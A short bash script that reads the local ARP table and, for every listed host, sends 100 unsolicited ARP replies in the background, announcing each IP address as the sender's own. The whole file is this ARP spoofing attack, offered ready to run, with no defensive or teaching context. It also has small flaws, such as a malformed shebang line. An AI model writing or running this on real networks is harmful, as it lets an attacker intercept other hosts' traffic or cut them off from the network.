#/bin/bash
# Spam everyone in arp liste with resposne packets

line=2
# for each line of the arp table
/usr/sbin/arp | awk '{if (NR>1) print}' | while read arpLine;
do
  # find the ip address
  ip="$(/usr/sbin/arp | awk '{if (NR==var) print}' var="${line}" | awk '{print $1}')"
  # find the internet gateway (not sure what it's called) EX: enp0s8
  gateway="$(/usr/sbin/arp | awk '{if (NR==var) print}' var="${line}" | awk '{print $5}')"
  # call the arping command and broadcast each ip as our own (run as bg process)
  /usr/bin/arping -A -I "$gateway" "$ip" -c 100 -q &
  line="$((line+1))"
done
